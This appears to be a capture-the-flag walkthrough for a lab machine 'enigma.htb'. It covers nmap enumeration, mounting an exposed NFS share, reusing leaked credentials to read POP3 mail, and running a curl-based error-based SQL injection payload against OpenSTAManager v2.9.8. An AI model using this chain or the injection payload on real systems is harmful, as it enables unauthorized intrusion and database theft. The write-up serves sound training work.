#nfs
```bash
nmap -sV -sC {IP}
```
shows:
* ssh open
* http open
* 110 pop3 client
* 111 rpcbind
* 143 imap client
* 2049 nfs

Lets see what we can access using nfs:
```bash
nmap -p 111,2049 --script=nfs-showmount,nfs-ls,nfs-statfs {IP}
```

It shows us that:
* exists the volume: `/srv/nfs/onboarding`
* exists the file: `New_Employee_access.pdf` 

So we mount the filesystem
```bash
sudo mount -t nfs {IP}/srv/nfs/onboarding /mnt/nfs
```

And we can copy `/mnt/nfs/New_"Employee_access.pdf` in our filesystem.

We discover that there is an user `kevin` with password `Enigma2024!`.

Now we try to connect to POP3, using ssl (since witouth authentication doesn't work)

```bash
openssl s_client -connect {IP}:995 -crlf
```

Using POP3's protocol we try to login, and check the inbox:
```POP3
USER kevin
PASS Enigma2024!
LIST
```

the output for list is:
```POP3
+OK 1 messages:
1 1473
.
```


so we can do `retr 1` (note: `RETR` (upper case) might not work) to discover that there is an user named `sarah`.


So we try:
```POP3
USER sarah
PASS Enigma2024!
```

and again `retr 1` (note: must be lower case!) and we discover that:
* there is a domain named `http://support_001.engima.htb`
* username: `admin`
* password: `Ne3s4rtars78s`

Now trying to connect to the web server using `support_001.enigma.htb` ww can login and see a big dashboard.

We find out that it is running `OpenSTAManager v2.9.8` and that it is vulnerable to SQL Injection, so following the proof of concept here: https://github.com/advisories/GHSA-4xwv-49c8-fvhq.

```bash
curl -c cookies.txt -X POST 'http://support_001.enigma.htb' -d 'username=admin&password=Ne3s4rtars78s'
```

```bash
curl -b cookies.txt \
  -d "op=send_reminder&id_records[]=-999) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(USER(),' | ',VERSION()))))%23" \
  "http://support_001.enigma.htb/actions.php?id_module=18"
```

inside the output, it will appear database usernname and host.